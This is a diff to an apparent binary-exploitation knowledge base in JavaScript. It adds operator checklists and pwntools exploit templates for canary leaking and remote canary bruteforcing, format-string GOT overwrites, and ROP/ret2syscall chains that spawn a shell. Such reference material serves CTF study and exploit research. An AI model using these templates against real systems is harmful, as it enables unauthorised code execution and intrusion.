@@ -274,9 +274,13 @@ p.send(payload)`,
     },
     
     operatorChecklist: [
-      "[ ] Verify format string works",
-      "[ ] Find exact input offset on stack",
-      "[ ] Check RELRO (Partial/No RELRO required for GOT overwrite)"
+      "[ ] Verify format string works: input %x.%x.%x.%x or %p.%p.%p.%p",
+      "[ ] Find exact input offset on stack: send AAAA%N$p until AAAA appears",
+      "[ ] Check RELRO level (Partial/No RELRO required for GOT overwrite via %n)",
+      "[ ] If Full RELRO: target __malloc_hook, __free_hook, or FSOP instead of GOT",
+      "[ ] Determine available specifiers: %p (leak), %n (write), %hn (short write), %hhn (byte write)",
+      "[ ] Build write payload with pwntools fmtstr_payload if GOT overwrite possible",
+      "[ ] Test read (%p) before attempting write (%n) to confirm offset",
     ],
     
     vulnerabilityTypes: ["CWE-134", "Format String"],
@@ -333,9 +337,15 @@ malloc(0x20) # returns target_addr!`
     },
     
     operatorChecklist: [
-      '[ ] Determine glibc version (crucial for heap techniques)',
+      '[ ] Determine glibc version: ldd ./binary; strings /path/to/libc.so.6 | grep "GNU C"',
       '[ ] Check if Safe Linking XOR protection is enabled (glibc >= 2.32)',
-      '[ ] Keep heap layout clean and aligned'
+      '[ ] Check if tcache is enabled (glibc >= 2.26) and count limits',
+      '[ ] Identify vulnerable buffer and overflow size (how many bytes past chunk boundary)',
+      '[ ] Allocate/free chunks to set up a clean heap layout before exploitation',
+      '[ ] Corrupt next chunk metadata (size, fd, bk) via the overflow',
+      '[ ] Determine target chunk for corruption (tcache, fastbin, unsorted bin)',
+      '[ ] Verify corruption in GDB: pwndbg bins, vis_heap_chunks',
+      '[ ] Chain to code execution: allocate controlled chunk, overwrite hook/vtable/FSOP',
     ],
     
     vulnerabilityTypes: ['CWE-122', 'Heap Overflow'],
@@ -2628,11 +2638,15 @@ q = malloc(0x60)  # q == target_addr!`,
     },
 
     operatorChecklist: [
-      '[ ] Free chunk to tcache',
-      '[ ] Use UAF to overwrite tcache metadata',
-      '[ ] Set entries[size_index] = target_address',
-      '[ ] malloc returns target address',
-      '[ ] Chain with second-stage technique'
+      '[ ] Confirm glibc version 2.31-2.33 for House of IO applicability',
+      '[ ] Free chunk to tcache and obtain dangling pointer (UAF)',
+      '[ ] Locate tcache_perthread_struct address via heap base offset',
+      '[ ] Use UAF to overwrite tcache metadata via the dangling pointer',
+      '[ ] Set entries[size_index] = target_address for arbitrary allocation',
+      '[ ] Set counts[size_index] to appropriate non-zero value',
+      '[ ] Verify corrupted tcache entry: pwndbg bins, tcache',
+      '[ ] malloc(target_size) returns the arbitrary address',
+      '[ ] Chain with second-stage technique for code execution',
     ],
 
     vulnerabilityTypes: ['heap', 'tcache', 'uaf'],
@@ -2693,11 +2707,14 @@ q = malloc(0x60)  # q == target_addr!`,
     },
 
     operatorChecklist: [
-      '[ ] Identify tcache metadata location',
-      '[ ] Overflow into counts array',
-      '[ ] Set counts to desired values',
-      '[ ] Combine with fd corruption',
-      '[ ] Note: patched in glibc 2.42+'
+      '[ ] Identify tcache_perthread_struct location in heap arena',
+      '[ ] Calculate size_index for the target allocation size class',
+      '[ ] Overflow into counts array to manipulate tcache behavior',
+      '[ ] Set counts to desired values (non-zero = entries available)',
+      '[ ] Combine with fd pointer corruption for full arbitrary allocation',
+      '[ ] Verify overflow reaches tcache metadata: pwndbg tcache',
+      '[ ] Check glibc version: patched in glibc 2.42+ (alternative: tcache_metadata_hijacking)',
+      '[ ] Chain with second-stage exploitation technique',
     ],
 
     vulnerabilityTypes: ['heap', 'tcache', 'overflow'],
@@ -2757,10 +2774,14 @@ p = malloc(target_size)  # p == target_addr!`,
     },
 
     operatorChecklist: [
-      '[ ] Identify tcache metadata in glibc 2.42+',
-      '[ ] Overflow into metadata',
-      '[ ] Corrupt entries and counts',
-      '[ ] malloc returns target address'
+      '[ ] Identify tcache metadata location in glibc 2.42+',
+      '[ ] Calculate size_index for the target allocation size',
+      '[ ] Overflow or write into tcache_perthread_struct entries/counts arrays',
+      '[ ] Set entries[size_index] = target_address for arbitrary allocation',
+      '[ ] Set counts[size_index] to appropriate value (>0 for malloc to follow)',
+      '[ ] Verify corrupted metadata in GDB: pwndbg bins, tcache bins',
+      '[ ] malloc(target_size) returns the target address',
+      '[ ] Chain with second-stage technique (write to __free_hook, GOT, FSOP)',
     ],
 
     vulnerabilityTypes: ['heap', 'tcache', 'overflow'],
@@ -3037,10 +3058,13 @@ malloc(0x10000)  # large malloc
     },
 
     operatorChecklist: [
-      '[ ] Identify PROTECT_PTR mechanism',
-      '[ ] Write fd twice with different values',
-      '[ ] Verify arbitrary pointer in tcache',
-      '[ ] malloc returns arbitrary address'
+      '[ ] Verify PROTECT_PTR / Safe-Linking is active (glibc >= 2.32)',
+      '[ ] Understand XOR mask: PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr',
+      '[ ] First write: set freed chunk fd to (chunk_addr >> 12) ^ target_addr',
+      '[ ] Second write: verify the decrypted pointer equals target_addr',
+      '[ ] Verify arbitrary pointer appears in tcache bin: pwndbg bins',
+      '[ ] malloc(target_size) returns the arbitrary address',
+      '[ ] Chain with second-stage: write to __free_hook, GOT, or FSOP target',
     ],
 
     vulnerabilityTypes: ['heap', 'tcache', 'safe-linking'],
@@ -3475,7 +3499,14 @@ exit(0)  # → _IO_wfile_overflow → one_gadget`,
       successIndicators: ['Identified readable, writable, executable regions.'],
       artifacts: ['Memory map layout notes'],
     },
-    operatorChecklist: ['Check for executable stack (NX disabled)', 'Check for PIE (randomized code segment)'],
+    operatorChecklist: [
+      '[ ] Run checksec to list all protections (NX, PIE, canary, RELRO)',
+      '[ ] Identify stack, heap, libc, and binary base address ranges',
+      '[ ] Check for executable stack (NX disabled) and executable heap',
+      '[ ] Find PIE/non-PIE base address for ASLR bypass',
+      '[ ] Map writable sections (.data, .bss, .got) for write targets',
+      '[ ] Use vmmap in pwndbg to verify runtime memory permissions',
+    ],
     vulnerabilityTypes: ['General'],
     references: []
   },
@@ -3508,7 +3539,13 @@ exit(0)  # → _IO_wfile_overflow → one_gadget`,
       successIndicators: ['Function successfully called with controlled arguments.'],
       artifacts: ['ROP chain payload'],
     },
-    operatorChecklist: ['Verify correct register order for architecture', 'Ensure stack alignment (16-byte for x86_64 before call)'],
+    operatorChecklist: [
+      '[ ] Identify target architecture (x86_64, x86, ARM, AArch64)',
+      '[ ] Verify correct register order for calling convention (e.g., rdi, rsi, rdx, rcx, r8, r9 for x86_64 System V)',
+      '[ ] Ensure stack alignment (16-byte for x86_64 before call instruction)',
+      '[ ] Find "pop rdi; ret" and other register-setting gadgets with ROPgadget/ropper',
+      '[ ] Verify argument passing for syscall convention (rax=syscall#, rdi=arg1, etc.)',
+    ],
     vulnerabilityTypes: ['General'],
     references: []
   },
@@ -3540,7 +3577,14 @@ exit(0)  # → _IO_wfile_overflow → one_gadget`,
       successIndicators: ['Found addresses of important sections or functions.'],
       artifacts: ['ELF analysis report'],
     },
-    operatorChecklist: ['Check dynamically linked vs statically linked', 'Find address of `.bss` for writing data'],
+    operatorChecklist: [
+      '[ ] Check dynamically linked vs statically linked with `file ./binary`',
+      '[ ] Find GOT/PLT addresses: readelf -r ./binary | grep GOT',
+      '[ ] Check RELRO level: readelf -d ./binary | grep BIND_NOW',
+      '[ ] Locate .bss and writable sections for data placement',
+      '[ ] Find entry point and main: readelf -h ./binary; objdump -d ./binary | grep "<main>"',
+      '[ ] Identify symbols: nm ./binary | grep -i "func\\|win\\|shell"',
+    ],
     vulnerabilityTypes: ['General'],
     references: []
   },
@@ -3573,7 +3617,14 @@ exit(0)  # → _IO_wfile_overflow → one_gadget`,
       successIndicators: ['Execution redirected when target function is called.'],
       artifacts: ['Payload with GOT overwrite'],
     },
-    operatorChecklist: ['Verify RELRO status (Partial or No RELRO required)', 'Confirm the target function is called after overwrite'],
+    operatorChecklist: [
+      '[ ] Verify RELRO status with checksec (Partial/No RELRO required for GOT overwrite)',
+      '[ ] Find target GOT entry address: readelf -r ./binary | grep puts',
+      '[ ] Find replacement function address in libc',
+      '[ ] Build write payload (format string %n or heap arbitrary write)',
+      '[ ] Confirm the target function is called after overwrite',
+      '[ ] If Full RELRO: target __malloc_hook, __free_hook, or FSOP instead',
+    ],
     vulnerabilityTypes: ['General'],
     references: []
   },
@@ -3605,7 +3656,14 @@ exit(0)  # → _IO_wfile_overflow → one_gadget`,
       successIndicators: ['Understanding of current heap layout and free lists.'],
       artifacts: ['Heap layout analysis'],
     },
-    operatorChecklist: ['Identify glibc version', 'Check if tcache is enabled (glibc >= 2.26)'],
+    operatorChecklist: [
+      '[ ] Identify glibc version: ldd ./binary; strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C"',
+      '[ ] Check if tcache is enabled (glibc >= 2.26)',
+      '[ ] Check for Safe-Linking (glibc >= 2.32): fd pointers are XORed',
+      '[ ] Examine bin layout in GDB: pwndbg bins',
+      '[ ] Identify chunk size classes for fastbin/tcache/smallbin/largebin',
+      '[ ] Locate the tcache_perthread_struct and heap base address',
+    ],
     vulnerabilityTypes: ['Heap'],
     references: []
   },
@@ -3643,7 +3701,14 @@ exit(0)  # → _IO_wfile_overflow → one_gadget`,
       successIndicators: ['Successfully debugged binary.'],
       artifacts: [],
     },
-    operatorChecklist: ['Install via git clone and setup.sh'],
+    operatorChecklist: [
+      '[ ] Clone pwndbg repo: git clone https://github.com/pwndbg/pwndbg',
+      '[ ] Run setup: cd pwndbg && ./setup.sh',
+      '[ ] Verify pwndbg loads: gdb ./binary → check for pwndbg prompt',
+      '[ ] Test key commands: vmmap, heap, bins, checksec, canary, telescope',
+      '[ ] Set disassembly flavor: set disassembly-flavor intel',
+      '[ ] Configure context layout for exploit development workflow',
+    ],
     vulnerabilityTypes: ['General'],
     references: []
   },
@@ -3676,7 +3741,14 @@ exit(0)  # → _IO_wfile_overflow → one_gadget`,
       successIndicators: ['Successfully debugged binary.'],
       artifacts: [],
     },
-    operatorChecklist: ['Install via curl script'],
+    operatorChecklist: [
+      '[ ] Install GEF: bash -c "$(curl -fsSL https://gef.blah.cat/sh)"',
+      '[ ] Verify GEF loads: gdb ./binary → check for GEF prompt',
+      '[ ] Test pattern create/search: pattern create 200 → pattern search $rsp',
+      '[ ] Test heap analysis: heap chunks, heap bins',
+      '[ ] Test checksec: gef checksec',
+      '[ ] Set assembly syntax: set disassembly-flavor intel',
+    ],
     vulnerabilityTypes: ['General'],
     references: []
   },
@@ -3710,7 +3782,15 @@ exit(0)  # → _IO_wfile_overflow → one_gadget`,
       successIndicators: ['Exploit script executed successfully.'],
       artifacts: ['exploit.py'],
     },
-    operatorChecklist: ['Install via `pip install pwntools`'],
+    operatorChecklist: [
+      '[ ] Install pwntools: pip install pwntools',
+      '[ ] Import and configure: from pwn import *; context.arch = "amd64"',
+      '[ ] Create connection: p = process("./binary") or p = remote("host", port)',
+      '[ ] Use ELF class for analysis: elf = ELF("./binary"); elf.got, elf.symbols',
+      '[ ] Build ROP chains: rop = ROP(libc); rop.call("system", ["/bin/sh"])',
+      '[ ] Find offsets: cyclic(200) → cyclic_find(core.read(rsp, 4))',
+      '[ ] Use shellcraft for shellcode: asm(shellcraft.sh())',
+    ],
     vulnerabilityTypes: ['General'],
     references: []
   },
@@ -3741,7 +3821,14 @@ exit(0)  # → _IO_wfile_overflow → one_gadget`,
       successIndicators: ['Found required ROP gadgets.'],
       artifacts: ['Gadget addresses'],
     },
-    operatorChecklist: ['Install via `pip install ropper`'],
+    operatorChecklist: [
+      '[ ] Install ropper: pip install ropper',
+      '[ ] Search for gadgets: ropper --file ./binary --search "pop rdi"',
+      '[ ] Find syscall gadgets: ropper --file ./binary --search "syscall"',
+      '[ ] Build ROP chains: ropper --file ./binary --chain execve',
+      '[ ] Search for specific instruction patterns: ropper --file ./binary --search "leave; ret"',
+      '[ ] Compare with ROPgadget output for completeness',
+    ],
     vulnerabilityTypes: ['General'],
     references: []
   },
@@ -3773,7 +3860,14 @@ exit(0)  # → _IO_wfile_overflow → one_gadget`,
       successIndicators: ['Found one_gadget offsets and constraints.'],
       artifacts: ['One gadget offsets'],
     },
-    operatorChecklist: ['Install via `gem install one_gadget`', 'Ensure constraints are satisfied at the time of execution'],
+    operatorChecklist: [
+      '[ ] Install one_gadget: gem install one_gadget',
+      '[ ] Run on target libc: one_gadget /lib/x86_64-linux-gnu/libc.so.6',
+      '[ ] Note each gadget address and its constraints',
+      '[ ] Verify constraints are satisfied at the call site in your exploit',
+      '[ ] Test each gadget locally: if constraints don\'t match, try the next one',
+      '[ ] Use with pwntools: one_gadget offsets integrated via libc.one_gadget()',
+    ],
     vulnerabilityTypes: ['General'],
     references: []
   },
@@ -4639,8 +4733,888 @@ p = gdb.debug('./arm_binary', arch='arm')`,
     references: [
       { description: 'QEMU Documentation', url: 'https://www.qemu.org/docs/master/user/main.html' }
     ]
-  }
-};
+  },
 
-// Create flat list for backward compatibility
+  // ─── DETAILED KB ENTRIES FOR PREVIOUSLY GENERIC-MAPPED TECHNIQUES ───
+
+  canary_leak: {
+    id: 'canary_leak',
+    name: 'Canary Leak',
+    category: 'technique',
+    class: 'Defense Bypass',
+    description: 'Reading the stack canary value through an information disclosure primitive (format string, OOB read) before overwriting it. Once leaked, the canary can be placed back into the overflow payload at the correct offset, bypassing __stack_chk_fail entirely.',
+    preconditions: {
+      summary: 'A read primitive exists that can reach the canary on the stack. Most commonly: a format string specifier (%p, %x) that prints stack values, or an out-of-bounds read that reaches the canary\'s position.',
+      required: [
+        'Stack canary enabled (checksec shows Canary: yes)',
+        'Read primitive: format string, OOB read, or uninitialized stack read',
+        'Knowledge of canary position relative to buffer (typically at rbp-8 on x86_64)',
+      ],
+      detectionSteps: [
+        'checksec --file=./binary → confirm canary',
+        'In GDB: canary → prints the canary value and offset from RBP',
+        'Run with format string input: echo "%15$p" | ./binary → look for 0xXXXXXXXXXX ending in \\x00',
+        'Canary value always ends in a NULL byte (LSB) on Linux — confirms you found it',
+      ],
+      offsetDiscovery: {
+        'pwntools': 'Canary offset = (rbp_offset - 8)',
+        'pwndbg': 'canary → shows offset from stack top',
+      },
+    },
+    exploitationPaths: [
+      {
+        name: 'Format String Canary Leak',
+        description: 'Use printf format specifiers to read the canary from the stack.',
+        steps: [
+          'Send format string probe: "%p %p %p %p..." or use pwntools FmtStr',
+          'Identify the canary value (always ends in 0x00)',
+          'Calculate canary offset on stack',
+          'Include canary at correct position in overflow payload',
+        ],
+        tools: ['pwntools FmtStr', 'pwndbg canary', 'GDB'],
+        codeSnippet: `from pwn import *
+p = process('./binary')
+# Leak canary at offset N
+p.sendlineafter(b'> ', b'%15$p')
+canary = int(p.recvline().strip(), 16)
+log.info(f'Canary: {hex(canary)}')
+
+# Build overflow payload with canary
+payload = b'A' * offset + p64(canary) + b'B' * 8 + p64(rip)
+p.sendline(payload)`,
+        references: [{ description: 'Format string canary leak technique' }],
+      },
+      {
+        name: 'OOB Read / Uninitialized Stack Leak',
+        description: 'If the binary prints back stack content (e.g., prints buffer contents including adjacent bytes), the canary may be leaked.',
+        steps: [
+          'Fill buffer up to but not past the canary',
+          'Binary prints buffer content → canary bytes visible',
+          'Parse the canary value from output',
+          'Use canary in overflow payload',
+        ],
+        tools: ['pwntools', 'GDB', 'pwndbg telescope'],
+        codeSnippet: `# If binary does: write(1, buf, len) where len includes stack junk
+# Send exactly buffer_size bytes to avoid canary corruption
+# The output may contain canary bytes after the buffer
+p.send(b'A' * buf_size)
+leak = p.recv(buf_size + 8)  # canary is 8 bytes past buffer
+canary = u64(leak[buf_size:buf_size+8])
+log.info(f'Leaked canary: {hex(canary)}')`,
+        references: [{ description: 'Stack leak via OOB read' }],
+      },
+    ],
+    postconditions: {
+      successIndicators: ['Canary value obtained ending in 0x00', 'Overflow payload does not trigger __stack_chk_fail'],
+      artifacts: ['Leaked canary value', 'Offset from buffer start to canary'],
+    },
+    operatorChecklist: [
+      '[ ] Confirm canary is enabled with checksec',
+      '[ ] Find format string offset or OOB read that reaches canary',
+      '[ ] Leak and verify canary (ends in NULL byte on Linux)',
+      '[ ] Place canary in overflow payload at correct offset',
+      '[ ] Verify no crash on return (canary bypass successful)',
+    ],
+    vulnerabilityTypes: ['stack-overflow', 'format-string', 'info-leak'],
+    references: [
+      { description: 'Stack Canaries (CTF 101)', url: 'https://ctf101.org/binary-exploitation/stack-canaries/' },
+      { description: 'pwndbg canary command', url: 'https://github.com/pwndbg/pwndbg' },
+    ],
+  },
+
+  canary_bruteforce: {
+    id: 'canary_bruteforce',
+    name: 'Canary Bruteforce',
+    category: 'technique',
+    class: 'Defense Bypass',
+    description: 'Byte-by-byte brute force of the stack canary in a forking server where child processes inherit the canary from the parent. Each byte can be tested individually because the canary is invariant across fork() calls, and a wrong byte causes the child to crash (which the parent survives).',
+    preconditions: {
+      summary: 'The target is a forking network server: fork() is called after accept(), so each connection gets the same canary. We test one byte at a time — 256 attempts per byte × 8 bytes = 2048 connections worst case.',
+      required: [
+        'Forking server (parent survives child crashes)',
+        'Buffer overflow that overwrites past canary position',
+        'Ability to detect crash vs. no-crash (oracle)',
+        'Canary does not change between connections (no atfork handler re-randomizing)',
+      ],
+      detectionSteps: [
+        'Connect to remote, send overflow → connection closes (canary corrupted)',
+        'Reconnect immediately → server still up (forking confirmed)',
+        'Send 7 + 0x00 → if no crash, first byte is 0x00 (canary LSB is always 0x00 on Linux)',
+        'Iterate: 7 + known + byte_N → 256 attempts per byte position',
+      ],
+    },
+    exploitationPaths: [
+      {
+        name: 'Byte-by-Byte Canary Brute Force',
+        description: 'Test each byte of the canary individually, leveraging fork() to keep the parent alive.',
+        steps: [
+          'Confirm canary LSB is 0x00 (Linux convention — skip first byte)',
+          'For each byte position (1-7): try all 256 values',
+          'No crash → correct byte; crash → wrong byte, try next',
+          'Assemble recovered canary and use in final overflow',
+        ],
+        tools: ['pwntools', 'netcat', 'custom brute script'],
+        codeSnippet: `from pwn import *
+
+def bruteforce_canary(host, port, offset):
+    canary = b'\\x00'  # LSB is always 0x00 on Linux
+    for byte_pos in range(1, 8):
+        for byte_val in range(256):
+            p = remote(host, port)
+            p.recvuntil(b'> ')
+            payload = b'A' * offset + canary + bytes([byte_val])
+            try:
+                p.send(payload)
+                response = p.recv(timeout=2)
+                canary += bytes([byte_val])
+                p.close()
+                log.success(f'Byte {byte_pos}: 0x{byte_val:02x}')
+                break
+            except:
+                p.close()
+                continue
+    return canary
+
+canary = bruteforce_canary('target', 9999, 64)
+log.info(f'Recovered canary: {canary.hex()}')`,
+        references: [{ description: 'Canary bruteforce technique for forking servers' }],
+      },
+    ],
+    postconditions: {
+      successIndicators: ['Canary recovered (8 bytes ending in 0x00)', 'Overflow payload with canary does not trigger crash'],
+      artifacts: ['Recovered canary bytes', 'Confirmation of forking server model'],
+    },
+    operatorChecklist: [
+      '[ ] Confirm server forks on each connection',
+      '[ ] Find offset from buffer to canary',
+      '[ ] Remember canary LSB is always 0x00 on Linux',
+      '[ ] Brute force remaining 7 bytes (256 attempts each)',
+      '[ ] Use recovered canary in final exploit',
+    ],
+    vulnerabilityTypes: ['stack-overflow', 'bruteforce', 'canary-bypass'],
+    references: [
+      { description: 'Forking server canary brute force' },
+    ],
+  },
+
+  format_string_detailed: {
+    id: 'format_string_detailed',
+    name: 'Format String Vulnerability (Detailed)',
+    category: 'technique',
+    class: 'Memory Corruption',
+    description: 'When user input is passed directly as the format string argument to printf/fprintf/sprintf, the attacker can use format specifiers (%x, %p, %n, %s) to read arbitrary stack/memory values and write arbitrary values to memory. This is one of the most versatile bugs — enabling info leak, GOT overwrite, canary leak, and arbitrary write, all from a single vulnerability.',
+    preconditions: {
+      summary: 'A function in the printf family uses user-controlled input as the format string argument. This is typically: printf(user_buf) instead of printf("%s", user_buf).',
+      required: [
+        'printf(), sprintf(), fprintf(), or snprintf() with user input as format string',
+        'Direct input flow from attacker to format argument (no sanitizer)',
+        'Output channel back to attacker (for leak), or crash oracle (for blind)',
+      ],
+      detectionSteps: [
+        'Send %p.%p.%p.%p — if you see hex values, format string confirmed',
+        'Send %x — look for hex output',
+        'Send %s — may crash (dereferencing arbitrary pointer)',
+        'Send %% — should print a single % (confirms format processing)',
+        'Use ltrace to see: printf(user_buf) vs printf("%s", user_buf)',
+      ],
+      offsetDiscovery: {
+        'pwntools': 'fmtstr_payload(offset, {target: value})',
+        'manual': 'Send %1$p %2$p %3$p... until you see your input',
+        'pwndbg': 'printf-args command',
+      },
+    },
+    exploitationPaths: [
+      {
+        name: 'Format String Leak (Read)',
+        description: 'Use %p, %x, %s to leak stack values, canary, libc pointers, and heap addresses.',
+        steps: [
+          'Find format string offset with cyclic input',
+          'Leak canary: position N on stack where canary resides',
+          'Leak libc: position where return address or GOT entry resides',
+          'Leak heap: position where heap pointer resides',
+        ],
+        tools: ['pwntools fmtstr', 'GDB', 'ltrace'],
+        codeSnippet: `from pwn import *
+p = process('./vuln')
+# Leak canary at stack offset 15
+p.sendlineafter(b'> ', b'%15$p')
+canary = int(p.recvline().strip(), 16)
+
+# Leak libc return address
+p.sendlineafter(b'> ', b'%41$p')
+libc_leak = int(p.recvline().strip(), 16)
+libc_base = libc_leak - OFFSET`,
+        applicableLibc: 'All',
+        references: [{ description: 'Format String 101' }],
+      },
+      {
+        name: 'Format String Write (GOT Overwrite)',
+        description: 'Use %n and %hn to write arbitrary values to GOT entries, redirecting function calls.',
+        steps: [
+          'Find format string offset with AAAA%X$p',
+          'Calculate target GOT address (e.g., puts@GOT)',
+          'Calculate value to write (e.g., system address)',
+          'Use pwntools fmtstr_payload to build the write',
+        ],
+        tools: ['pwntools fmtstr_payload', 'objdump', 'readelf'],
+        codeSnippet: `from pwn import *
+
+elf = ELF('./vuln')
+libc = ELF('./libc.so.6')
+
+# Write system to puts@GOT
+writes = {elf.got['puts']: libc.sym['system']}
+payload = fmtstr_payload(OFFSET, writes, write_size='short')
+p.sendline(payload)
+
+# Now when program calls puts(user_input), it calls system(user_input)
+p.sendline(b'/bin/sh')`,
+        applicableLibc: 'All (with Partial/No RELRO)',
+        references: [{ description: 'pwntools fmtstr documentation' }],
+      },
+    ],
+    postconditions: {
+      successIndicators: ['Format specifiers produce hex/pointer output', 'GOT entries overwritten to target addresses'],
+      artifacts: ['Format string offset', 'Leaked addresses (canary, libc, heap)'],
+    },
+    operatorChecklist: [
+      '[ ] Confirm format string with %p.%p or %x',
+      '[ ] Find format string offset using AAAA%N$p',
+      '[ ] Determine read/write capability (%p for read, %n for write)',
+      '[ ] Check RELRO: Full RELRO blocks GOT writes',
+      '[ ] If Partial/No RELRO: plan GOT overwrite with fmtstr_payload',
+      '[ ] If Full RELRO: target __malloc_hook, __free_hook, or FSOP',
+    ],
+    vulnerabilityTypes: ['format-string', 'info-leak', 'arbitrary-write'],
+    references: [
+      { description: 'Format String Vulnerabilities (CTF 101)', url: 'https://ctf101.org/binary-exploitation/format-string/' },
+      { description: 'pwntools fmtstr', url: 'https://docs.pwntools.com/en/stable/fmtstr.html' },
+    ],
+  },
+
+  got_overwrite: {
+    id: 'got_overwrite',
+    name: 'GOT Overwrite',
+    category: 'technique',
+    class: 'Control Flow Hijack',
+    description: 'Overwriting a Global Offset Table (GOT) entry to redirect a function call to an attacker-controlled address. The GOT stores resolved addresses for dynamically-linked functions — if writable, changing puts@GOT to system() means the next call to puts() executes system(). Works with any write primitive: format string %n, heap arbitrary write, or direct memory write.',
+    preconditions: {
+      summary: 'A write primitive exists that can target the GOT. Partial RELRO or No RELRO means the GOT is writable. Full RELRO makes the GOT read-only after resolution, blocking this attack.',
+      required: [
+        'Write primitive: format string, heap write, or arbitrary write',
+        'GOT entry at known address (No PIE or PIE bypassed)',
+        'Partial RELRO or No RELRO (Full RELRO blocks this)',
+        'Target function address (e.g., system in libc)',
+      ],
+      detectionSteps: [
+        'checksec → check RELRO status (No/Partial = writable)',
+        'readelf -r ./binary | grep GOT → find GOT entries',
+        'objdump -d ./binary | grep plt → find PLT/GOT pairs',
+        'Identify which GOT entry to target (commonly: puts, printf, free)',
+      ],
+      offsetDiscovery: {
+        'pwntools': 'elf.got["puts"], libc.sym["system"]',
+        'readelf': 'readelf -r ./binary | grep puts',
+        'objdump': 'objdump -d ./binary | grep "@plt>"',
+      },
+    },
+    exploitationPaths: [
+      {
+        name: 'Format String GOT Overwrite',
+        description: 'Use %hn (short write) to overwrite a GOT entry byte-by-byte via format string.',
+        steps: [
+          'Find GOT entry address for target function',
+          'Find replacement function address (e.g., system)',
+          'Calculate short writes needed for each 2 bytes',
+          'Build fmtstr_payload with target address',
+        ],
+        tools: ['pwntools fmtstr_payload', 'readelf', 'objdump'],
+        codeSnippet: `from pwn import *
+writes = {elf.got['puts']: libc.sym['system']}
+payload = fmtstr_payload(OFFSET, writes, write_size='short')
+p.sendline(payload)
+p.sendline(b'/bin/sh')`,
+        applicableLibc: 'All (Partial/No RELRO)',
+      },
+      {
+        name: 'Heap Arbitrary Write → GOT Overwrite',
+        description: 'After obtaining an arbitrary write through heap exploitation (tcache poison, fastbin dup, etc.), write system to a GOT entry.',
+        steps: [
+          'Obtain arbitrary write via heap technique',
+          'Calculate GOT entry address and system() address',
+          'Write system address to GOT entry',
+          'Trigger the hijacked function call',
+        ],
+        tools: ['pwndbg', 'pwntools', 'one_gadget'],
+        codeSnippet: `# After tcache poison or similar gives arbitrary write
+arb_write(elf.got['free'], libc.sym['system'])
+free(buf_containing_binsh)  # → system("/bin/sh")`,
+        applicableLibc: 'glibc < 2.34 (hooks available), any (GOT overwrite)',
+      },
+    ],
+    postconditions: {
+      successIndicators: ['GOT entry overwritten with target address', 'Hijacked function call executes with attacker arguments'],
+      artifacts: ['Target function GOT address', 'Replacement function libc offset'],
+    },
+    operatorChecklist: [
+      '[ ] Check RELRO status: only Partial or No RELRO allows GOT writes',
+      '[ ] Identify target GOT entry (puts, printf, free, etc.)',
+      '[ ] Find replacement function offset in libc',
+      '[ ] Build write payload (format string or heap arbitrary write)',
+      '[ ] Trigger hijacked function with desired argument',
+    ],
+    vulnerabilityTypes: ['format-string', 'arbitrary-write', 'got-overwrite'],
+    references: [
+      { description: 'GOT Overwrite technique' },
+      { description: 'PLT/GOT internals' },
+    ],
+  },
+
+  rop_chain_detailed: {
+    id: 'rop_chain_detailed',
+    name: 'ROP Chain (Detailed)',
+    category: 'technique',
+    class: 'Code Reuse',
+    description: 'Return-Oriented Programming chains together short sequences of instructions ending in "ret" (called gadgets) from existing executable memory to perform arbitrary computation. Each gadget pops values into registers, calls functions, or sets up arguments. The chain is placed on the stack, and when the function returns, execution flows through the gadgets in sequence.',
+    preconditions: {
+      summary: 'A stack buffer overflow with sufficient overflow space (4-8+ register setups). The binary must have executable code segments with useful gadgets. NX must be enabled (otherwise just use shellcode).',
+      required: [
+        'Stack buffer overflow with control over RIP',
+        'Sufficient overflow space (usually 40-200+ bytes)',
+        'Executable memory (binary, libc) containing gadgets',
+        'Knowledge of gadget addresses (No PIE or address leak)',
+      ],
+      detectionSteps: [
+        'ROPgadget --binary ./binary → find pop rdi; ret and other gadgets',
+        'ropper --file ./binary --search "pop rdi"',
+        'In pwntools: ROP(elf) for automatic chain building',
+        'Check if binary has useful functions: system(), execve()',
+      ],
+      offsetDiscovery: {
+        'ROPgadget': 'ROPgadget --binary ./binary | grep "pop rdi"',
+        'ropper': 'ropper --file ./binary --search "pop rdi"',
+        'pwntools': 'rop = ROP(elf); rop.call("system", [next(elf.search(b"/bin/sh"))])',
+      },
+    },
+    exploitationPaths: [
+      {
+        name: 'Simple ret2libc via ROP',
+        description: 'Pop /bin/sh into rdi, then call system(). Classic ret2libc via ROP gadgets.',
+        steps: [
+          'Find offset to RIP using cyclic pattern',
+          'Find "pop rdi; ret" gadget address',
+          'Find "/bin/sh" string address in libc',
+          'Find system() address in libc',
+          'Chain: padding + pop_rdi + &"/bin/sh" + system',
+        ],
+        tools: ['pwntools ROP', 'ROPgadget', 'one_gadget', 'ropper'],
+        codeSnippet: `from pwn import *
+elf = ELF('./binary')
+libc = ELF('./libc.so.6')
+rop = ROP(libc)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret = rop.find_gadget(['ret'])[0]  # for stack alignment
+
+payload = b'A' * offset
+payload += p64(ret)          # stack alignment
+payload += p64(pop_rdi)
+payload += p64(next(libc.search(b'/bin/sh')))
+payload += p64(libc.sym['system'])`,
+        applicableLibc: 'All (dynamically linked)',
+      },
+      {
+        name: 'ret2syscall (Static Binary)',
+        description: 'For statically linked binaries with no libc: chain syscall gadgets to set rax=59 (execve), rdi="/bin/sh", rsi=0, rdx=0, then syscall.',
+        steps: [
+          'Find gadgets: pop rax; ret, pop rdi; ret, pop rsi; ret, pop rdx; ret, syscall; ret',
+          'Write /bin/sh string to known writable address',
+          'Chain all register pop gadgets + syscall',
+        ],
+        tools: ['ROPgadget', 'ropper', 'pwntools'],
+        codeSnippet: `from pwn import *
+pop_rax = 0x??????
+pop_rdi = 0x??????
+pop_rsi = 0x??????
+pop_rdx = 0x??????
+syscall_ret = 0x??????
+writable = 0x??????
+
+payload = b'A' * offset
+payload += p64(pop_rax) + p64(59)   # SYS_execve
+payload += p64(pop_rdi) + p64(writable)  # &"/bin/sh"
+payload += p64(pop_rsi) + p64(0)     # argv = NULL
+payload += p64(pop_rdx) + p64(0)     # envp = NULL
+payload += p64(syscall_ret)`,
+        applicableLibc: 'Static binary (no libc)',
+      },
+    ],
+    postconditions: {
+      successIndicators: ['Shell spawned', 'Function called with attacker-controlled arguments'],
+      artifacts: ['Gadget addresses', 'Pop chain offsets', 'Libc base address'],
+    },
+    operatorChecklist: [
+      '[ ] Find offset to RIP with cyclic pattern',
+      '[ ] Check if libc leak is needed (PIE/ASLR)',
